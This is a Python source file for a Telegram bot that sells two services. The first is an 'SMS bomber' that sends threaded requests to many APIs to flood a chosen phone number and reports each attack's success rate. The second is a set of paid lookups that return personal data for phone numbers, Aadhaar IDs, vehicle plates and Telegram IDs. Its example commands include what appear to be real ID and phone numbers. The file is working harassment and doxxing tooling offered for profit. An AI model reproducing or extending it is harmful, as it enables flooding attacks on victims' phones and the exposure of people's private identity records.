def run_sms_bomber(chat_id, msg_id, number, message):
    total = len(BOMBER_URLS)
    success = 0
    failed = 0
    lock = threading.Lock()
    
    def hit_api(url, idx):
        nonlocal success, failed
        result = send_bomber_request(url, number, message)
        with lock:
            if result: success += 1
            else: failed += 1
            if (success + failed) % 3 == 0:
                done = success + failed
                percent = int((done / total) * 100)
                filled = percent // 10
                bar = "🟥" * filled + "⬛" * (10 - filled)
                try:
                    bot.edit_message_text(
                        f"`💥 SMS BOMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
                        f"`📱 {number}`\n`💬 {message[:25]}`\n"
                        f"{bar} `{percent}%`\n"
                        f"`✅ {success} | ❌ {failed} | {done}/{total}`",
                        chat_id, msg_id, parse_mode='Markdown'
                    )
                except: pass
    
    threads = []
    for idx, url in enumerate(BOMBER_URLS, 1):
        t = threading.Thread(target=hit_api, args=(url, idx), daemon=True)
        threads.append(t); t.start()
    
    for t in threads:
        try: t.join(timeout=8)
        except: pass
    
    rate = int((success / total) * 100) if total > 0 else 0
    verdict = "🔥 SUCCESSFUL" if rate >= 70 else "⚠️ PARTIAL" if rate >= 40 else "❌ FAILED"
    
    try:
        bot.edit_message_text(
            f"`💥 ATTACK COMPLETE`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
            f"`📱 {number}`\n`💬 {message[:40]}`\n"
            f"`━━━━━━━━━━━━━━━━━━━━━`\n"
            f"`✅ SUCCESS : {success}`\n`❌ FAILED  : {failed}`\n"
            f"`📊 RATE    : {rate}%`\n`🎯 VERDICT : {verdict}`\n"
            f"`🔐 {OWNER}`",
            chat_id, msg_id, parse_mode='Markdown'
        )
    except: pass
    
    try:
        bot.send_message(ADMIN_ID, f"💥 BOMBER LOG\n👤 {chat_id}\n📱 {number}\n💬 {message}\n✅ {success}/{total}")
    except: pass

# ==================== KEYBOARDS ====================
def welcome_kb(l):
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(InlineKeyboardButton("🎁 FREE Daily Coin Claim", callback_data="claim_coin"))
    mk.add(InlineKeyboardButton("💳 Buy Premium", callback_data="show_premium"))
    mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
    return mk

def premium_plans_kb(l):
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(InlineKeyboardButton("💳 1 Day – ₹10", callback_data="pay_1day"))
    mk.add(InlineKeyboardButton("💳 1 Week – ₹60", callback_data="pay_7days"))
    mk.add(InlineKeyboardButton("💳 1 Month – ₹101", callback_data="pay_30days"))
    mk.add(InlineKeyboardButton("🔙 Back", callback_data="back_to_welcome"))
    return mk

def main_menu(l):
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("🔍 " + L[l]['search'], callback_data="search_menu"))
    mk.add(InlineKeyboardButton("💥 SMS Bomber", callback_data="bomber_start"))
    mk.add(InlineKeyboardButton("💎 " + L[l]['premium'], callback_data="show_premium"))
    mk.add(InlineKeyboardButton("🎁 Claim Coin", callback_data="claim_coin"))
    mk.add(InlineKeyboardButton("👤 " + L[l]['profile_btn'], callback_data="profile"))
    mk.add(InlineKeyboardButton("❓ " + L[l]['help_btn'], callback_data="help"))
    mk.add(InlineKeyboardButton("ℹ️ " + L[l]['about_btn'], callback_data="about"))
    mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
    mk.add(InlineKeyboardButton("📢 Channel", url=CHANNEL))
    mk.add(InlineKeyboardButton(L[l]['clear_btn'], callback_data="clear"))
    return mk

def search_menu(l):
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("📱 Number", callback_data="info"),
        InlineKeyboardButton("🚗 Vehicle", callback_data="vehicle_info"),
        InlineKeyboardButton("🚘 Vehicle Spl", callback_data="vehicle_special_info"),
        InlineKeyboardButton("🆔 Aadhaar", callback_data="aadhaar_info"),
        InlineKeyboardButton("🔍 Special", callback_data="special_info"),
        InlineKeyboardButton("🆔 Aadhaar Spl", callback_data="aadhaar_special_info"),
        InlineKeyboardButton("📞 TG to Num", callback_data="tg_number_info"),
        InlineKeyboardButton("🇵🇰 Pakistan", callback_data="pakistan_info")
    )
    mk.add(InlineKeyboardButton("🔙 Back", callback_data="main_menu"))
    return mk

def group_menu(l):
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("📱 Number", callback_data="info"),
        InlineKeyboardButton("🚗 Vehicle", callback_data="vehicle_info"),
        InlineKeyboardButton("🆔 Aadhaar", callback_data="aadhaar_info"),
        InlineKeyboardButton("🔍 Special", callback_data="special_info")
    )
    mk.add(InlineKeyboardButton("💥 SMS Bomber", callback_data="bomber_start"))
    mk.add(InlineKeyboardButton("💎 Premium", callback_data="show_premium"))
    mk.add(InlineKeyboardButton("🎁 Claim Coin", callback_data="claim_coin"))
    mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
    return mk

def result_btn(query, lang, flags="0000000", message_id=None, is_group=False):
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("📊 JSON", callback_data=f"json_{query}_{flags}"))
    mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
    mk.add(InlineKeyboardButton("🔗 Group", url=GROUP))
    mk.add(InlineKeyboardButton("🗑️ " + L[lang]['clear_btn'], callback_data="clear"))
    mk.add(InlineKeyboardButton("🔙 " + L[lang]['back'], callback_data="main_menu"))
    if is_group and message_id:
        mk.add(InlineKeyboardButton("📌 Pin", callback_data=f"pin_{message_id}"))
    return mk

def back_btn(l):
    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("🔙 " + L[l]['back'], callback_data="main_menu"))
    return mk

def lang_selection():
    mk = InlineKeyboardMarkup(row_width=3)
    mk.add(
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
        InlineKeyboardButton("🇮🇳 हिन्दी", callback_data="lang_hi"),
        InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn"),
        InlineKeyboardButton("🇮🇳 मराठी", callback_data="lang_mr"),
        InlineKeyboardButton("🇵🇰 اُردو", callback_data="lang_ur"),
        InlineKeyboardButton("🇮🇳 தமிழ்", callback_data="lang_ta")
    )
    return mk

def send_welcome_with_qr(chat_id, l, edit_message_id=None):
    caption = L[l]['welcome']
    kb = welcome_kb(l)
    try:
        with open(QR_PATH, 'rb') as qr:
            if edit_message_id:
                try: bot.delete_message(chat_id, edit_message_id)
                except: pass
            bot.send_photo(chat_id, qr, caption=caption, reply_markup=kb, parse_mode='Markdown')
    except:
        bot.send_message(chat_id, caption, reply_markup=kb, parse_mode='Markdown')

# ==================== CALLBACKS ====================
@bot.callback_query_handler(func=lambda c: c.data.startswith('lang_'))
def lc(c):
    l = c.data.split('_')[1]
    sl(c.from_user.id, l)
    ensure_user(c.from_user.id, c.from_user.first_name or "User", c.from_user.username or "")
    try: bot.delete_message(c.message.chat.id, c.message.message_id)
    except: pass
    send_welcome_with_qr(c.message.chat.id, l)
    bot.answer_callback_query(c.id, "✅")

@bot.callback_query_handler(func=lambda c: c.data == "claim_coin")
def claim_coin_cb(c):
    l = gl(c.from_user.id)
    ensure_user(c.from_user.id, c.from_user.first_name or "User", c.from_user.username or "")
    if claim_daily_coin(c.from_user.id):
        coins = gc(c.from_user.id)
        bot.answer_callback_query(c.id, f"🎉 +1 Coin! Total: {coins}")
        bot.send_message(c.message.chat.id, L[l]['coin_claimed'].format(coins=coins), reply_markup=main_menu(l), parse_mode='Markdown')
    else:
        bot.answer_callback_query(c.id, "❌ Already claimed!", True)
        bot.send_message(c.message.chat.id, L[l]['already_claimed'], reply_markup=main_menu(l))

@bot.callback_query_handler(func=lambda c: c.data == "show_premium")
def show_premium_cb(c):
    l = gl(c.from_user.id)
    if ip(c.from_user.id):
        bot.answer_callback_query(c.id, "💎 Already Premium!", True); return
    try:
        with open(QR_PATH, 'rb') as qr:
            bot.send_photo(c.message.chat.id, qr, caption=L[l]['welcome'], reply_markup=premium_plans_kb(l), parse_mode='Markdown')
    except:
        bot.send_message(c.message.chat.id, L[l]['welcome'], reply_markup=premium_plans_kb(l), parse_mode='Markdown')
    bot.answer_callback_query(c.id, "💎 Plans")

@bot.callback_query_handler(func=lambda c: c.data == "back_to_welcome")
def back_welcome_cb(c):
    l = gl(c.from_user.id)
    try: bot.delete_message(c.message.chat.id, c.message.message_id)
    except: pass
    send_welcome_with_qr(c.message.chat.id, l)
    bot.answer_callback_query(c.id, "🔙")

@bot.callback_query_handler(func=lambda c: c.data.startswith('pay_'))
def pay_cb(c):
    l = gl(c.from_user.id)
    plan = c.data.split('_')[1]
    plan_map = {'1day': (1, '₹10'), '7days': (7, '₹60'), '30days': (30, '₹101')}
    if plan not in plan_map:
        bot.answer_callback_query(c.id, "❌ Invalid", True); return
    days, amount = plan_map[plan]
    bot.answer_callback_query(c.id, f"💳 {amount}")
    text = f"💳 **Payment**\n\n📦 Plan: {days} Days\n💰 {amount}\n🏦 UPI: `{UPI_ID}`\n📤 Send screenshot to @Cyber_With_Ranjan"
    try:
        with open(QR_PATH, 'rb') as qr:
            bot.send_photo(c.message.chat.id, qr, caption=text, parse_mode='Markdown')
    except:
        bot.send_message(c.message.chat.id, text, parse_mode='Markdown')
    bot.answer_callback_query(c.id, "💳")

@bot.callback_query_handler(func=lambda c: c.data == "bomber_start")
def bomber_start_cb(c):
    uid = c.from_user.id
    ensure_user(uid, c.from_user.first_name or "User", c.from_user.username or "")
    if not ip(uid):
        bot.answer_callback_query(c.id, "💎 Premium Required!", True)
        mk = InlineKeyboardMarkup(row_width=1)
        mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
        mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
        bot.send_message(c.message.chat.id, "🔒 **SMS BOMBER — Premium Only**", reply_markup=mk, parse_mode='Markdown')
        return
    BOMBER_STATE[uid] = {"step": "number", "number": "", "message": ""}
    bot.answer_callback_query(c.id, "💥 SMS Bomber")
    bot.send_message(c.message.chat.id, "💥 **SMS BOMBER v3.0**\n\n📱 Send 10-digit number:\n`9876543210`\n\n💡 Fast: `/boom 9876543210 Message`", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda c: c.data == "bomber_confirm")
def bomber_confirm_cb(c):
    uid = c.from_user.id
    state = BOMBER_STATE.get(uid)
    if not state or state.get("step") != "confirm":
        bot.answer_callback_query(c.id, "❌ Session expired!", True); return
    number = state.get("number", "")
    message = state.get("message", "")
    bot.answer_callback_query(c.id, "💥 Launching!")
    try: bot.delete_message(c.message.chat.id, c.message.message_id)
    except: pass
    try:
        msg = bot.send_message(c.message.chat.id, "`💥 LAUNCHING...`", parse_mode='Markdown')
        threading.Thread(target=run_sms_bomber, args=(c.message.chat.id, msg.message_id, number, message), daemon=True).start()
    except Exception as e:
        bot.send_message(c.message.chat.id, "❌ Error launching bomber.")
    BOMBER_STATE.pop(uid, None)

@bot.callback_query_handler(func=lambda c: c.data == "bomber_confirm_direct")
def bomber_confirm_direct(c):
    bomber_confirm_cb(c)

@bot.callback_query_handler(func=lambda c: c.data == "bomber_cancel")
def bomber_cancel_cb(c):
    uid = c.from_user.id
    BOMBER_STATE.pop(uid, None)
    try: bot.delete_message(c.message.chat.id, c.message.message_id)
    except: pass
    bot.answer_callback_query(c.id, "❌ Cancelled")
    bot.send_message(c.message.chat.id, "❌ Cancelled.", reply_markup=main_menu(gl(uid)))

@bot.callback_query_handler(func=lambda cb: cb.data == "profile")
def profile_cb(cb):
    uid = cb.from_user.id
    ensure_user(uid, cb.from_user.first_name or "User", cb.from_user.username or "")
    coins = gc(uid)
    prem = "✅ Active" if ip(uid) else "❌ Inactive"
    searches = 0
    try:
        cur = conn.cursor()
        cur.execute("SELECT searches FROM users WHERE user_id=?", (uid,))
        r = cur.fetchone()
        searches = r[0] if r else 0
    except: pass
    l = gl(uid)
    bot.answer_callback_query(cb.id, "👤")
    bot.send_message(cb.message.chat.id, L[l]['profile'].format(uid=uid, coins=coins, prem=prem, searches=searches), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda c: c.data == "help")
def help_cb(c):
    l = gl(c.from_user.id)
    bot.answer_callback_query(c.id, "❓")
    bot.send_message(c.message.chat.id, L[l]['help'], reply_markup=back_btn(l), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda c: c.data == "about")
def about_cb(c):
    l = gl(c.from_user.id)
    bot.send_message(c.message.chat.id, L[l]['about'] + f"\n🌐 {WEBSITE}", reply_markup=back_btn(l), parse_mode='Markdown')
    bot.answer_callback_query(c.id, "ℹ️")

@bot.callback_query_handler(func=lambda c: c.data == "clear")
def clear_cb(c):
    try:
        bot.delete_message(c.message.chat.id, c.message.message_id)
        bot.answer_callback_query(c.id, "🗑️")
    except: bot.answer_callback_query(c.id, "❌", True)

@bot.callback_query_handler(func=lambda c: c.data == "main_menu")
def main_menu_cb(c):
    l = gl(c.from_user.id)
    coins = gc(c.from_user.id)
    if ip(c.from_user.id):
        text = f"{L[l]['main_menu']}\n\n💎 **Premium** — Unlimited"
    else:
        text = f"{L[l]['main_menu']}\n\n🪙 **Coins:** {coins}"
    try:
        bot.edit_message_text(text, c.message.chat.id, c.message.message_id, reply_markup=main_menu(l), parse_mode='Markdown')
    except:
        bot.send_message(c.message.chat.id, text, reply_markup=main_menu(l), parse_mode='Markdown')
    bot.answer_callback_query(c.id, "🔙")

@bot.callback_query_handler(func=lambda c: c.data == "search_menu")
def search_menu_cb(c):
    l = gl(c.from_user.id)
    coins_info = ""
    if not ip(c.from_user.id):
        coins = gc(c.from_user.id)
        coins_info = f"\n\n🪙 Coins Left: **{coins}**"
    try:
        bot.edit_message_text("🔍 " + L[l]['search'] + coins_info, c.message.chat.id, c.message.message_id, reply_markup=search_menu(l), parse_mode='Markdown')
    except:
        bot.send_message(c.message.chat.id, "🔍 " + L[l]['search'] + coins_info, reply_markup=search_menu(l), parse_mode='Markdown')
    bot.answer_callback_query(c.id, "🔍")

@bot.callback_query_handler(func=lambda c: c.data in ["info", "vehicle_info", "vehicle_special_info", "aadhaar_info", "special_info", "aadhaar_special_info", "tg_number_info", "pakistan_info"])
def info_cb(c):
    l = gl(c.from_user.id)
    if not ip(c.from_user.id):
        coins = gc(c.from_user.id)
        if coins <= 0:
            bot.answer_callback_query(c.id, "❌ No coins!", True)
            mk = InlineKeyboardMarkup(row_width=1)
            mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
            mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
            bot.send_message(c.message.chat.id, "❌ No coins! Claim daily FREE coin.", reply_markup=mk)
            return
    prompts = {
        "aadhaar_info": L[l]['enter_aadhaar'],
        "vehicle_special_info": L[l]['enter_vehicle_special'],
        "vehicle_info": L[l]['enter_vehicle'],
        "special_info": L[l]['enter_special'],
        "aadhaar_special_info": L[l]['enter_aadhaar_special'],
        "tg_number_info": L[l]['enter_tg_number'],
        "pakistan_info": L[l]['enter_pakistan'],
        "info": L[l]['enter_number']
    }
    bot.send_message(c.message.chat.id, prompts.get(c.data, L[l]['enter_number']))
    bot.answer_callback_query(c.id, "🔍")

@bot.callback_query_handler(func=lambda c: c.data.startswith('json_'))
def json_cb(c):
    parts = c.data.split('_', 2)
    if len(parts) < 3:
        bot.answer_callback_query(c.id, "❌", True); return
    q = parts[1]
    flags = parts[2] if parts[2] else "0000000"
    is_vehicle = len(flags) > 0 and flags[0] == '1'
    is_special = len(flags) > 1 and flags[1] == '1'
    is_aadhaar = len(flags) > 2 and flags[2] == '1'
    is_number_special = len(flags) > 3 and flags[3] == '1'
    is_aadhaar_special = len(flags) > 4 and flags[4] == '1'
    is_tg_number = len(flags) > 5 and flags[5] == '1'
    is_pakistan = len(flags) > 6 and flags[6] == '1'

    bot.answer_callback_query(c.id, "📊 Loading...")
    if is_aadhaar_special: d = fetch_aadhaar_special(q)
    elif is_pakistan: d = fetch_pakistan(q)
    elif is_tg_number: d = fetch_tg_number(q)
    elif is_aadhaar: d = fetch_aadhaar(q)
    elif is_number_special: d = fetch_special(q)
    elif is_special: d = fetch_vehicle_special(q)
    elif is_vehicle: d = fetch_vehicle(q)
    else: d = fetch_number(q)

    if not d:
        bot.send_message(c.message.chat.id, "❌ No data"); return
    try:
        jtext = json.dumps(d, indent=2, ensure_ascii=False)
        if len(jtext) > 3800: jtext = jtext[:3800] + "\n... (truncated)"
        bot.send_message(c.message.chat.id, f"`📊 JSON\n\n{jtext}`", parse_mode='Markdown')
    except:
        bot.send_message(c.message.chat.id, f"📊 JSON:\n`{str(d)[:3500]}`", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda c: c.data.startswith('pin_'))
def pin_callback(c):
    if c.from_user.id != ADMIN_ID:
        bot.answer_callback_query(c.id, "❌ Admin only", True); return
    try:
        message_id = int(c.data.split('_', 1)[1])
        bot.pin_chat_message(c.message.chat.id, message_id)
        bot.answer_callback_query(c.id, "📌 Pinned!", show_alert=False)
        bot.send_message(c.message.chat.id, "📌 Pinned!")
    except: bot.answer_callback_query(c.id, "❌ Pin failed!", True)

# ==================== PROCESS QUERY ====================
def process_query(m, q, is_vehicle=False, is_special=False, is_aadhaar=False, is_number_special=False,
                  is_aadhaar_special=False, is_tg_number=False, is_pakistan=False):
    l = gl(m.from_user.id)
    ensure_user(m.from_user.id, m.from_user.first_name or "User", m.from_user.username or "")
    is_premium_user = ip(m.from_user.id)
    is_group = m.chat.type in ['group', 'supergroup']

    if not is_premium_user:
        coins = gc(m.from_user.id)
        if coins <= 0:
            mk = InlineKeyboardMarkup(row_width=1)
            mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
            mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
            bot.reply_to(m, "❌ **No Coins!** Claim daily FREE coin.", reply_markup=mk, parse_mode='Markdown')
            return
        if not dc(m.from_user.id):
            bot.reply_to(m, L[l]['nc'], reply_markup=main_menu(l))
            return

    if is_aadhaar_special: stype = "AADHAAR SPL"
    elif is_pakistan: stype = "PAKISTAN"
    elif is_tg_number: stype = "TG-NUMBER"
    elif is_aadhaar: stype = "AADHAAR"
    elif is_number_special: stype = "SPECIAL"
    elif is_special: stype = "VEHICLE SPL"
    elif is_vehicle: stype = "VEHICLE"
    else: stype = "NUMBER"

    flags = f"{int(is_vehicle)}{int(is_special)}{int(is_aadhaar)}{int(is_number_special)}{int(is_aadhaar_special)}{int(is_tg_number)}{int(is_pakistan)}"

    data_holder = {"d": None}
    def fetch_data():
        if is_aadhaar_special: data_holder["d"] = fetch_aadhaar_special(q)
        elif is_pakistan: data_holder["d"] = fetch_pakistan(q)
        elif is_tg_number: data_holder["d"] = fetch_tg_number(q)
        elif is_aadhaar: data_holder["d"] = fetch_aadhaar(q)
        elif is_number_special: data_holder["d"] = fetch_special(q)
        elif is_special: data_holder["d"] = fetch_vehicle_special(q)
        elif is_vehicle: data_holder["d"] = fetch_vehicle(q)
        else: data_holder["d"] = fetch_number(q)

    fetch_thread = threading.Thread(target=fetch_data, daemon=True)
    fetch_thread.start()

    try: msg = bot.reply_to(m, "`💻 INITIALIZING...`", parse_mode='Markdown')
    except: msg = bot.reply_to(m, "💻 INITIALIZING...")

    try: hacker_loading(m.chat.id, msg.message_id, q, stype)
    except: pass

    fetch_thread.join(timeout=10)
    d = data_holder["d"]

    if not d:
        try:
            bot.edit_message_text(f"`❌ ACCESS DENIED`\n\n`> {q}`\n`> No data / API error`", m.chat.id, msg.message_id, parse_mode='Markdown')
        except:
            bot.send_message(m.chat.id, "❌ No data / API error.")
        return

    send_log(m.from_user.id, m.from_user.username, q, d, stype)
    res = format_result(d, q, is_vehicle, is_special, is_aadhaar, is_number_special, is_aadhaar_special, is_tg_number, is_pakistan)

    try:
        bot.edit_message_text(
            f"`╔══════════════════════════════╗`\n"
            f"`║  💚 ACCESS GRANTED 💚        ║`\n"
            f"`╚══════════════════════════════╝`\n"
            f"`🎯 {q}`\n"
            f"{res}",
            m.chat.id, msg.message_id, parse_mode='Markdown'
        )
        markup = result_btn(q, l, flags, msg.message_id if is_group else None, is_group)
        bot.edit_message_reply_markup(m.chat.id, msg.message_id, reply_markup=markup)
    except Exception as e:
        # ✅ FIX: safe error message (no markdown parse on exception string)
        try:
            bot.send_message(m.chat.id, "❌ Error occurred. Try again.")
        except: pass
        return

    if not is_premium_user and not is_group:
        coins_left = gc(m.from_user.id)
        if coins_left > 0:
            try: bot.send_message(m.chat.id, f"🪙 **Coins Left: {coins_left}**", parse_mode='Markdown')
            except: pass

# ==================== COMMANDS ====================
@bot.message_handler(commands=['start'], chat_types=['private'])
def st(m):
    au(m.from_user.id, m.from_user.first_name or "", m.from_user.username or "")
    bot.send_message(m.chat.id, L['en']['lang'], reply_markup=lang_selection(), parse_mode='Markdown')

@bot.message_handler(commands=['myid', 'id', 'whoami'])
def myid_cmd(m):
    uid = m.from_user.id
    un = m.from_user.username or "N/A"
    fn = m.from_user.first_name or "N/A"
    ensure_user(uid, fn, un)
    # ✅ FIX: escape markdown from user name
    fn_safe = _md_escape(fn)
    un_safe = _md_escape(un)
    try:
        bot.reply_to(m, f"🆔 **Your Telegram Info**\n\n👤 {fn_safe}\n📛 @{un_safe}\n🆔 **ID:** `{uid}`\n\n📌 Send to admin for Premium/Coins.", parse_mode='Markdown')
    except:
        bot.reply_to(m, f"Your Telegram Info\n\nName: {fn}\nUsername: @{un}\nID: {uid}\n\nSend to admin for Premium/Coins.")

@bot.message_handler(commands=['boom', 'bomber', 'smsbomb'], chat_types=['private'])
def boom_cmd(m):
    uid = m.from_user.id
    ensure_user(uid, m.from_user.first_name or "User", m.from_user.username or "")
    if not ip(uid):
        mk = InlineKeyboardMarkup(row_width=1)
        mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
        mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
        bot.reply_to(m, "🔒 **SMS BOMBER — Premium Only**", reply_markup=mk, parse_mode='Markdown')
        return
    parts = m.text.split(maxsplit=2)
    if len(parts) == 1:
        BOMBER_STATE[uid] = {"step": "number", "number": "", "message": ""}
        bot.reply_to(m, "💥 **SMS BOMBER**\n\n📱 Send 10-digit number:\n\n💡 Fast: `/boom 9876543210 Message`", parse_mode='Markdown')
        return
    if len(parts) == 2:
        number = parts[1].strip()
        if not is_valid_number(number):
            bot.reply_to(m, "❌ Invalid number!"); return
        BOMBER_STATE[uid] = {"step": "message", "number": number, "message": ""}
        bot.reply_to(m, f"✅ Number: `{number}`\n\n💬 Now send Message:", parse_mode='Markdown')
        return
    number = parts[1].strip()
    message = parts[2].strip()
    if not is_valid_number(number):
        bot.reply_to(m, "❌ Invalid number!"); return
    if len(message) < 1 or len(message) > 200:
        bot.reply_to(m, "❌ Message 1-200 chars!"); return
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("🚀 LAUNCH", callback_data="bomber_confirm_direct"), InlineKeyboardButton("❌ Cancel", callback_data="bomber_cancel"))
    BOMBER_STATE[uid] = {"step": "confirm", "number": number, "message": message}
    bot.reply_to(m, f"`💥 CONFIRM`\n`📱 {number}`\n`💬 {message}`", reply_markup=mk, parse_mode='Markdown')

@bot.message_handler(func=lambda m: BOMBER_STATE.get(m.from_user.id, {}).get("step") in ["number", "message"], chat_types=['private'])
def bomber_input_handler(m):
    uid = m.from_user.id
    state = BOMBER_STATE.get(uid, {})
    step = state.get("step")
    text = (m.text or "").strip()
    if step == "number":
        if not is_valid_number(text):
            bot.reply_to(m, "❌ Invalid number!"); return
        state["number"] = text; state["step"] = "message"
        BOMBER_STATE[uid] = state
        bot.reply_to(m, f"✅ Number: `{text}`\n\n💬 Send Message:", parse_mode='Markdown')
    elif step == "message":
        if len(text) < 1 or len(text) > 200:
            bot.reply_to(m, "❌ 1-200 chars!"); return
        state["message"] = text; state["step"] = "confirm"
        BOMBER_STATE[uid] = state
        mk = InlineKeyboardMarkup(row_width=2)
        mk.add(InlineKeyboardButton("🚀 LAUNCH", callback_data="bomber_confirm"), InlineKeyboardButton("❌ Cancel", callback_data="bomber_cancel"))
        bot.reply_to(m, f"`💥 CONFIRM`\n`📱 {state['number']}`\n`💬 {text}`", reply_markup=mk, parse_mode='Markdown')

@bot.message_handler(commands=['num', 'search'], chat_types=['private'])
def nc(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, L[gl(m.from_user.id)]['enter_number']); return
    process_query(m, p[1].strip())

@bot.message_handler(commands=['special'], chat_types=['private'])
def special_cmd(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "🔍 Send number for Special:"); return
    process_query(m, p[1].strip(), is_number_special=True)

@bot.message_handler(commands=['tgnumber', 'tg'], chat_types=['private'])
def tg_number_cmd(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "📞 Send Telegram ID:"); return
    process_query(m, p[1].strip(), is_tg_number=True)

@bot.message_handler(commands=['aadharspecial', 'aspecial'], chat_types=['private'])
def aadhaar_special_cmd(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "🆔 Send 12-digit Aadhaar:"); return
    process_query(m, p[1].strip(), is_aadhaar_special=True)

@bot.message_handler(commands=['pakistan', 'pk'], chat_types=['private'])
def pakistan_cmd(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "🇵🇰 Send Pakistan number:"); return
    process_query(m, p[1].strip(), is_pakistan=True)

@bot.message_handler(commands=['vehicle', 'v'], chat_types=['private'])
def vc(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, L[gl(m.from_user.id)]['enter_vehicle']); return
    process_query(m, p[1].strip(), is_vehicle=True)

@bot.message_handler(commands=['vehiclespecial', 'vs'], chat_types=['private'])
def vsc(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, L[gl(m.from_user.id)]['enter_vehicle_special']); return
    process_query(m, p[1].strip(), is_special=True)

@bot.message_handler(commands=['aadhaar', 'aadhar'], chat_types=['private'])
def acmd(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, L[gl(m.from_user.id)]['enter_aadhaar']); return
    process_query(m, p[1].strip(), is_aadhaar=True)

# ==================== AUTO-DETECT (PRIVATE + GROUP) ====================
@bot.message_handler(func=lambda m: re.match(r'^0\d{10}$', m.text or '') and BOMBER_STATE.get(m.from_user.id, {}).get("step") not in ["number", "message"] and not (m.text or '').startswith('/'), chat_types=['private', 'group', 'supergroup'])
def pkn(m): process_query(m, m.text.strip(), is_pakistan=True)

@bot.message_handler(func=lambda m: re.match(r'^\d{10}$', m.text or '') and BOMBER_STATE.get(m.from_user.id, {}).get("step") not in ["number", "message"] and not (m.text or '').startswith('/'), chat_types=['private', 'group', 'supergroup'])
def hn(m): process_query(m, m.text.strip())

@bot.message_handler(func=lambda m: re.match(r'^[A-Z]{2}\d{2}[A-Z]{0,2}\d{4}$', (m.text or '').upper()) and not (m.text or '').startswith('/'), chat_types=['private', 'group', 'supergroup'])
def vhn(m): process_query(m, m.text.strip().upper(), is_vehicle=True)

@bot.message_handler(func=lambda m: re.match(r'^\d{12}$', m.text or '') and not (m.text or '').startswith('/'), chat_types=['private', 'group', 'supergroup'])
def ahn(m): process_query(m, m.text.strip(), is_aadhaar=True)

# ==================== GROUP COMMANDS ====================
@bot.message_handler(commands=['num'], chat_types=['group', 'supergroup'])
def gn(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "❌ /num 9661756498"); return
    process_query(m, p[1].strip())

@bot.message_handler(commands=['special'], chat_types=['group', 'supergroup'])
def gspecial(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "❌ /special 9661756498"); return
    process_query(m, p[1].strip(), is_number_special=True)

@bot.message_handler(commands=['vehicle'], chat_types=['group', 'supergroup'])
def gv(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "❌ /vehicle RJ14CV0002"); return
    process_query(m, p[1].strip().upper(), is_vehicle=True)

@bot.message_handler(commands=['vehiclespecial'], chat_types=['group', 'supergroup'])
def gvs(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "❌ /vehiclespecial RJ14CV0002"); return
    process_query(m, p[1].strip().upper(), is_special=True)

@bot.message_handler(commands=['aadhaar'], chat_types=['group', 'supergroup'])
def gaadhaar(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "❌ /aadhaar 962397300673"); return
    process_query(m, p[1].strip(), is_aadhaar=True)

@bot.message_handler(commands=['aadharspecial'], chat_types=['group', 'supergroup'])
def gaadharspl(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "❌ /aadharspecial 254944943909"); return
    process_query(m, p[1].strip(), is_aadhaar_special=True)

@bot.message_handler(commands=['tgnumber'], chat_types=['group', 'supergroup'])
def gtgnum(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "❌ /tgnumber 6936978343"); return
    process_query(m, p[1].strip(), is_tg_number=True)

@bot.message_handler(commands=['pakistan'], chat_types=['group', 'supergroup'])
def gpak(m):
    p = m.text.split()
    if len(p) < 2: bot.reply_to(m, "❌ /pakistan 03359736848"); return
    process_query(m, p[1].strip(), is_pakistan=True)

@bot.message_handler(commands=['start', 'help'], chat_types=['group', 'supergroup'])
def gs(m):
    l = gl(m.from_user.id)
    bot.reply_to(m, "👋 /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom\n💎 1D ₹10, 1W ₹60, 1M ₹101\n\n⚡ Or just send a 10-digit number / vehicle / aadhaar directly!", reply_markup=group_menu(l))

# ==================== GENERAL ====================
@bot.message_handler(commands=['menu'])
def me(m):
    l = gl(m.from_user.id)
    if m.chat.type in ['group', 'supergroup']:
